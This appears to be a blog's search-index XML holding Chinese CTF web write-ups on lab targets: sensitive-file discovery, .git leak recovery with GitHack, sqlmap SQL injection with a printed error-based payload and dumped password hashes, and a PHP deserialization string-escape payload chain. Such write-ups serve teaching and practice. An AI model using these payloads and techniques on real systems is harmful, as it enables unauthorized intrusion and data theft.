punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>问题解决：0xGame{V2ry_simple_XXE}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随缘的WEB Write-up</title>
      <link href="article/suiyuan/"/>
      <url>article/suiyuan/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2>WEB-常见的搜集</h2><h3>信息收集</h3>题目链接：<a class="url" href="http://10.147.19.176:7001/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7001/</a><hr />敏感文件Hello, CTFer!信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西<p>hack fun</p><hr /><h4>yysy,确实</h4>信息收集<h5>Part1</h5>遇事不决，先扫为敬真·找到了<pre><code>/.index.php.swp</code></pre>知识链接：.swp文件是备份文件，平时vim强退一定要注意.swp文件的删除！<p>进去访问下载<br><? php echo 'flag3:cDBydGFudF9oYWNr}';?></p><p>发现flag3，说明flag分为好多部分</p><h5>Part2</h5>扫描还扫到了<pre><code>/index.php~</code></pre>直接访问得flag2:c192M3J5X2lt<h5>Part3</h5>将扫描进行到底还扫到了<pre><code>/robots.txt</code></pre>进去康康<pre><code>User-agent: *Disallow:/flag1_is_her3_fun.txt</code></pre>访问得flag1:aW5mb18x<h3>最终</h3>组合得flag<h5>小结</h5>扫就完事了<h2>WEB-粗心的小李</h2><h3>Git泄露</h3>题目链接：<a class="url" href="http://10.147.19.176:7002/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7002/</a><hr />Git测试Hello, CTFer!当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。<p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><hr /><h4>Git</h4>访问<code>./.git</code>发现跳转到了<code>./.git/</code>根据题目是git泄露<h5>神器Git Hack</h5>命令：<pre><code>$ python2 GitHack.py -u "http://10.147.19.176:7002/.git"</code></pre>扒下来.git文件<h5>分析</h5>命令看一下<pre><code>$ git log --reflogcommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88 (HEAD -> master)Author: Veneno <593220746@qq.com>Date:   Wed Dec 4 11:04:14 2019 +0800<p>flag<br></code></pre><br>发现有flag<br>恢复一下（注意，这里要往上一个目录）</p><pre><code>$ git reset --hard 213b7e386e9b0b406d91fae58bf8be11a58c3f88HEAD is now at 213b7e3 flag</code></pre><p>恢复了<code>index.html</code></p><h3>最终</h3>在<code>index.html</code>里找到flag<p>问题解决：n1book{Z2l0X2xvb2tzX3MwX2Vhc3lmdW4}</p><h5>小结</h5>Git hack好用，还有个git extrack<hr /><h2>WEB-SQL注入-1</h2><h3>SQL注入</h3>题目链接：<a class="url" href="http://10.147.19.176:7004/login.php" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7004/login.php</a><hr /><h4>SQLmap真香</h4><h5>sql注入不说了</h5>sqlmap直接跑由于是POST测试，抓个包下来存文件，在name处改个<code>*</code>跑sqlmap<pre><code>$ python2 sqlmap.py -r 1.txt</code></pre>出结果<pre><code>sqlmap identified the following injection point(s) with a total of 1488 HTTP(s) requests:</code></pre><hr /><pre><code>Parameter: #1* ((custom) POST)Type: error-basedTitle: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</code></pre><h5>Payload: name=' AND (SELECT 7087 FROM(SELECT COUNT(<em>),CONCAT(0x71786b7171,(SELECT (ELT(7087=7087,1))),0x717a627671,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Uilw&pass=1</h5><hr /><pre><code> [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL >= 5.0</code></pre>ok，直接全扒下来<code>--dump</code><pre><code>Database: noteTable: users[2 entries]+----+----------------------------------+----------+| id | passwd                           | username |+----+----------------------------------+----------+| 1  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | test     || 2  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | admin    |+----+----------------------------------+----------+</code></pre><h3>最终</h3><h5>Payload =<code>sqlmap.py -r 1.txt -D note -T fl4g --dump</code></h5>问题解决：n1book{bG9naW5fc3FsaV9pc19uaWNl}<h5>小结</h5>善用Sqlmap，能跑出来的不多了...<hr /><h2>Unserialize++</h2><h3>反序列化字符串逃逸</h3>guest.php先上payload打到admin，字符串逃逸成功<h4>payload = your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}</h4><h3>index.php中</h3><pre><code>file_put_contents("caches/".hash("sha256", \$\_SERVER['REMOTE_ADDR']), put(serialize($guest)));</code></pre>而<pre><code>function put($data)&#123;$data = str_replace(chr(0)."*".chr(0), 'uuuuuu', $data);return $data;&#125;</code></pre>每6个u换三个字符，使得name盖过pass的字符并"闭合，然后反序列化就会读取我们准备的字符，即从<pre><code>'your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;'</code></pre>的分号开始<p>本地.&#x2F;caches&#x2F;下的内容</p><pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre><p>即后get</p><pre><code>function get($data)&#123;$data = str_replace('uuuuuu', chr(0)."*".chr(0), $data);return $data;&#125;</code></pre><p>会读取</p><pre><code>"O:7:\"someone\":3:&#123;s:12:\"\\u0000*\\u0000your_name\";s:60:\"\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\";s:12:\"\\u0000*\\u0000your_pass\";s:53:\"AA\";s:12:\"\\u0000*\\u0000your_pass\";s:2:\"AA\";s:5:\"admin\";i:1;&#125;\";s:8:\"\\u0000*\\u0000admin\";i:0;&#125;"</code></pre><p>忽略不可见字符后<br>读取到其中</p><pre><code> [your_name:protected] => **********";s:12:"*your_pass";s:53:"AA [your_pass:protected] => AA  [admin:protected] => 1</code></pre><p>然而本题和admin<strong>没有</strong>任何关系</p><h3>构造</h3><pre><code>O:6:"level1":1:&#123;s:8:"username";O:6:"level2":1:&#123;s:8:"username";O:6:"level3":1:&#123;s:8:"username";s:5:"admin";&#125;&#125;&#125;</code></pre>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}<hr />check不允许匹配到"username"字符串<p>于是准备绕过<br>类型的字符S使用大写<br>u&#x3D;\75</p><hr />level2中有__wakeup()方法，于是绕过<pre><code>O:6:"level2":2</code></pre>例如本题，<pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>我们有u x60，最后换成字符30个，于是反序列化会继续向下读取<pre><code>s:60:"**********";s:12:"*your_pass";s:53:"AA    |（到此为止）</code></pre>然后"正常闭合，这样接下来就会读取我们构造的字符串，字符串成功逃逸<pre><code>";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;|（到此为止）</code></pre>下面无用了，因为}正常闭合，反序列化结束<pre><code>";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>以上是admin的方法，取flag原理方法同上<h3>最终</h3>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{S:8:"\75sername";O:6:"level2":2:{S:8:"\75sername";O:6:"level3":1:{S:8:"\75sername";s:5:"admin";}}}<p>再访问.&#x2F;guest.php解决</p><p>问题解决：s3c{NEJHdTBFaWJtekd5QFptRXZiTERTVW5rRTE4UDZrRio}</p><h5>小结：</h5>字符串逃逸字符个数<strong>一定</strong>要算好！（吐血]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="article/Hello%20World/"/>
      <url>article/Hello%20World/</url>
      
        <content type="html"><![CDATA[<p>hello</p><span id="more"></span><p>这是新建静态博客的第一篇文章、</p><p>这已经是第三次搭博客了…</p><p>马上搬运原文章来，记得做好备份QAQ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux C++编程</title>
      <link href="article/linuxprogramme/"/>
      <url>article/linuxprogramme/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码不太对，别想骗窝." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7fadfd42095d9a5d532ee0d5251a01b5c2bdb5ddc46b485ca0cad90ab5110a95"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码查看哦.">这里需要密码查看哦.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
